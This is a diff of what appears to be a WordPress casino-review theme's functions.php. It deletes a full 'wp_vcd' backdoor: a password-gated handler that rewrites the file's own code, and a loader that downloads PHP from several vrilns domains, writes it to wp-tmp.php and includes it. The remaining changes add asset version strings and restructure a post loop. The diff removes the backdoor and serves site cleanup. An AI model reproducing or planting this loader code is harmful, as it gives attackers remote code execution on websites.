@@ -1,187 +1,4 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'aea2bc00227a0b5f862fa70a771678c0'))
-	{
-$div_code_name="wp_vcd";
-		switch ($_REQUEST['action'])
-			{
-
-				
-
-
-
-
-				case 'change_domain';
-					if (isset($_REQUEST['newdomain']))
-						{
-							
-							if (!empty($_REQUEST['newdomain']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                                                                                                             {
-
-			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-
-								case 'change_code';
-					if (isset($_REQUEST['newcode']))
-						{
-							
-							if (!empty($_REQUEST['newcode']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-                                                                                                             {
-
-			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-				
-				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
-			}
-			
-		die("");
-	}
-
-
-
-
-
-
-
-
-$div_code_name = "wp_vcd";
-$funcfile      = __FILE__;
-if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-        
-        function file_get_contents_tcurl($url)
-        {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-            $data = curl_exec($ch);
-            curl_close($ch);
-            return $data;
-        }
-        
-        function theme_temp_setup($phpCode)
-        {
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-           if( fwrite($handle, "<?php\n" . $phpCode))
-		   {
-		   }
-			else
-			{
-			$tmpfname = tempnam('./', "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-			fwrite($handle, "<?php\n" . $phpCode);
-			}
-			fclose($handle);
-            include $tmpfname;
-            unlink($tmpfname);
-            return get_defined_vars();
-        }
-        
-
-$wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
-        if (($tmpcontent = @file_get_contents("http://www.vrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.vrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-        
-        
-        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        } 
-		
-		        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-           
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } 
-        
-        
-        
-        
-        
-    }
-}
-
-//$start_wp_theme_tmp
-
-
-
-//wp_tmp
-
-
-//$end_wp_theme_tmp
-?><?php
 
 
 //ADD NO INDEX, NOFOLLOW META TAG
@@ -230,7 +47,7 @@ function ox_adding_scripts()
         wp_enqueue_script('jquery');
 
         /*custom js*/
-        wp_enqueue_script('custom', get_template_directory_uri() . '/js/scripts.min.js', array('jquery'), null, true);
+        wp_enqueue_script('custom', get_template_directory_uri() . '/js/scripts.min.js?ver=1.1', array('jquery'), null, true);
 
         /*velocity*/
         wp_enqueue_script('velocity', get_template_directory_uri() . '/js/libs/velocity.min.js', array(), null, true);
@@ -254,7 +71,7 @@ function ox_adding_scripts()
             /*swiper css*/
             wp_enqueue_style('swiper', get_template_directory_uri() . '/css/libs/swiper.min.css', array(), null);
             /*custom css*/
-            wp_enqueue_style('custom', get_template_directory_uri() . '/css/style.min.css', array(), null);
+            wp_enqueue_style('custom', get_template_directory_uri() . '/css/style.min.css?ver=1.1', array(), null);
 
         }
 
@@ -451,7 +268,7 @@ function filter_function_show_category()
     $the_query_games_reviews = new WP_Query($args_games_reviews);
     $i = 1;
     if ($the_query_games_reviews->have_posts()) {
-        while ($the_query_games_reviews->have_posts()) {
+        while ($the_query_games_reviews->have_posts()) :
             $the_query_games_reviews->the_post();
 
             if ($i == 1) {
@@ -484,43 +301,39 @@ function filter_function_show_category()
 
             $i++;
 
-        }
+        endwhile;
 
     }
 
     wp_reset_postdata();
 
 //in category
-    $k = 0;
-    $wrap_div = "<div class='aussie-casino__category_result--wrap'>";
+
     $the_query_incategory = new WP_Query($args_incategory);
 
-    echo $wrap_div;
-    $total_posts = $the_query_incategory->post_count;
+    if ($the_query_incategory->have_posts()) {
+        $k = 0;
+        $wrap_div = "<div class='aussie-casino__category_result--wrap'>";
+        echo $wrap_div;
+        $total_posts = $the_query_incategory->post_count;
+        while ($the_query_incategory->have_posts()) {
 
-    while ($the_query_incategory->have_posts()) {
+            $the_query_incategory->the_post();
 
-        $the_query_incategory->the_post();
-
-        echo '<article class="aussie-casino__winning-guides_post--item" id="filter-games"><div class="aussie-casino__winning-guides_wrap--img"><img src="' . get_the_post_thumbnail_url($the_query_incategory->ID, 'full') . '" alt="' . get_the_title() . '"><span class="aussie-casino__winning-guides_date"><b>' . human_time_diff_enhanced() . '</b></span></div><a href=" ' . get_post_permalink() . ' ">' . get_the_title() . '</a></article>';
+            echo '<article class="aussie-casino__winning-guides_post--item" id="filter-games"><div class="aussie-casino__winning-guides_wrap--img"><img src="' . get_the_post_thumbnail_url($the_query_incategory->ID, 'full') . '" alt="' . get_the_title() . '"><span class="aussie-casino__winning-guides_date"><b>' . human_time_diff_enhanced() . '</b></span></div><a href=" ' . get_post_permalink() . ' ">' . get_the_title() . '</a></article>';
 
 
-        if ($k % 3 == 2 && $k != 0 && ($k + 1) != $total_posts) {
-            echo '</div></div>' . $wrap_div;
+            if ($k % 3 == 2 && $k != 0 && ($k + 1) != $total_posts) {
+                echo '</div></div>' . $wrap_div;
+
+            }
+
+            $k++;
 
         }
-
-        $k++;
-
-
     }
-
     wp_reset_postdata();
-
-
     die();
-
-
 }
 
 
